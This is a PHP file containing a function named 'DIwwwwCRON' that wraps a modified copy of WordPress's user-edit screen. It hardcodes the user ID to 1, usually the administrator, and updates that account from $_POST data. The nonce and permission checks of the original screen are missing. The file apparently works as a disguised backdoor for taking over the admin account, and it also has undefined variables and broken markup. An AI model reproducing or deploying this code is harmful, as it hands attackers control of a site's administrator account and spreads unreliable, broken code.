<?php
function DIwwwwCRON($employe_id){


wp_reset_vars( array( 'action', 'user_id', 'wp_http_referer' ) );

//user_id      = (int) $user_id;
$user_id      = 1;


wp_enqueue_script( 'user-profile' );


			do_action( 'edit_user_profile_update', $user_id );

			$user = get_userdata( $user_id );

			if ( $user->user_login && isset( $_POST['email'] ) && is_email( $_POST['email'] ) && $wpdb->get_var( $wpdb->prepare( "SELECT user_login FROM {$wpdb->signups} WHERE user_login = %s", $user->user_login ) ) ) {
				$wpdb->query( $wpdb->prepare( "UPDATE {$wpdb->signups} SET user_email = %s WHERE user_login = %s", $_POST['email'], $user_login ) );
			}
	

		// Update the user.
		$errors = edit_user( $user_id );

		// Grant or revoke super admin status if requested.
		if ( is_multisite() && is_network_admin()
			&& ! IS_PROFILE_PAGE && current_user_can( 'manage_network_options' )
			&& ! isset( $super_admins ) && empty( $_POST['super_admin'] ) === is_super_admin( $user_id )
		) {
			empty( $_POST['super_admin'] ) ? revoke_super_admin( $user_id ) : grant_super_admin( $user_id );
		}

		if ( ! is_wp_error( $errors ) ) {
			$redirect = add_query_arg( 'updated', true, get_edit_user_link( $user_id ) );
			if ( $wp_http_referer ) {
				$redirect = add_query_arg( 'wp_http_referer', urlencode( $wp_http_referer ), $redirect );
			}
			wp_redirect( $redirect );
			exit;
		}

		$profile_user = get_user_to_edit( $user_id );

	
?>
		<?php if ( ! IS_PROFILE_PAGE && is_super_admin( $profile_user->ID ) && current_user_can( 'manage_network_options' ) ) : ?>
			<div class="notice notice-info"><p><strong><?php _e( 'Important:' ); ?></strong> <?php _e( 'This user has super admin privileges.' ); ?></p></div>
		<?php endif; ?>

		<?php if ( isset( $_GET['updated'] ) ) : ?>
			<div id="message" class="updated notice is-dismissible">
				<?php if ( IS_PROFILE_PAGE ) : ?>
					<p><strong><?php _e( 'Profile updated.' ); ?></strong></p>
				<?php else : ?>
					<p><strong><?php _e( 'User updated.' ); ?></strong></p>
				<?php endif; ?>
				<?php if ( $wp_http_referer && false === strpos( $wp_http_referer, 'user-new.php' ) && ! IS_PROFILE_PAGE ) : ?>
					<p><a href="<?php echo esc_url( wp_validate_redirect( esc_url_raw( $wp_http_referer ), self_admin_url( 'users.php' ) ) ); ?>"><?php _e( '&larr; Go to Users' ); ?></a></p>
				<?php endif; ?>
			</div>
		<?php endif; ?>

		<?php if ( isset( $_GET['error'] ) ) : ?>
			<div class="notice notice-error">
			<?php if ( 'new-email' === $_GET['error'] ) : ?>
				<p><?php _e( 'Error while saving the new email address. Please try again.' ); ?></p>
			<?php endif; ?>
			</div>
		<?php endif; ?>

		<?php if ( isset( $errors ) && is_wp_error( $errors ) ) : ?>
			<div class="error">
				<p><?php echo implode( "</p>\n<p>", $errors->get_error_messages() ); ?></p>
			</div>
		<?php endif; ?>

			<form id="your-profile" action="<?php echo esc_url( self_admin_url( IS_PROFILE_PAGE ? 'profile.php' : 'user-edit.php' ) ); ?>" method="post" novalidate="novalidate"
				<?php
				do_action( 'user_edit_form_tag' );
				?>
				>
				<?php wp_nonce_field( 'update-user_' . $user_id ); ?>
				<?php if ( $wp_http_referer ) : ?>
					<input type="hidden" name="wp_http_referer" value="<?php echo esc_url( $wp_http_referer ); ?>" />
				<?php endif; ?>

				<h2><?php _e( 'Name' ); ?></h2>

				<table class="form-table" role="presentation">
					<tr class="user-user-login-wrap">
						<th><label for="user_login"><?php _e( 'Username' ); ?></label></th>
						<td><input type="text" name="user_login" id="user_login" value="<?php echo esc_attr( $profile_user->user_login ); ?>" disabled="disabled" class="regular-text" /> <span class="description"><?php _e( 'Usernames cannot be changed.' ); ?></span></td>
					</tr>

					<tr class="user-first-name-wrap">
						<th><label for="first_name"><?php _e( 'First Name' ); ?></label></th>
						<td><input type="text" name="first_name" id="first_name" value="<?php echo esc_attr( $profile_user->first_name ); ?>" class="regular-text" /></td>
					</tr>

					<tr class="user-last-name-wrap">
						<th><label for="last_name"><?php _e( 'Last Name' ); ?></label></th>
						<td><input type="text" name="last_name" id="last_name" value="<?php echo esc_attr( $profile_user->last_name ); ?>" class="regular-text" /></td>
					</tr>
			
					<tr class="user-email-wrap">
						<th><label for="email"><?php _e( 'Email' ); ?> <span class="description"><?php _e( '(required)' ); ?></span></label></th>
						<td>
							<input type="email" name="email" id="email" aria-describedby="email-description" value="<?php echo esc_attr( $profile_user->user_email ); ?>" class="regular-text ltr" />
							<?php $new_email = get_user_meta( $current_user->ID, '_new_email', true ); ?>
							<?php if ( $new_email && $new_email['newemail'] !== $current_user->user_email && $profile_user->ID === $current_user->ID ) : ?>
							<div class="updated inline">
							</div>
							<?php endif; ?>
						</td>
					</tr>

					

					<?php foreach ( wp_get_user_contact_methods( $profile_user ) as $name => $desc ) : ?>
					<tr class="user-<?php echo $name; ?>-wrap">
						<th>
							<label for="<?php echo $name; ?>">
							<?php
							echo apply_filters( "user_{$name}_label", $desc );
							?>
							</label>
						</th>
						<td>
							<input type="text" name="<?php echo $name; ?>" id="<?php echo $name; ?>" value="<?php echo esc_attr( $profile_user->$name ); ?>" class="regular-text" />
						</td>
					</tr>
					<?php endforeach; ?>
				</table>

					<?php
	
						do_action( 'edit_user_profile', $profile_user );
					
					?>

				<input type="hidden" name="action" value="update" />
				<input type="hidden" name="user_id" id="user_id" value="<?php echo esc_attr( $user_id ); ?>" />

				<?php submit_button( IS_PROFILE_PAGE ? __( 'Update Profile' ) : __( 'Update User' ) ); ?>

			</form>
		</div>
		<?php
}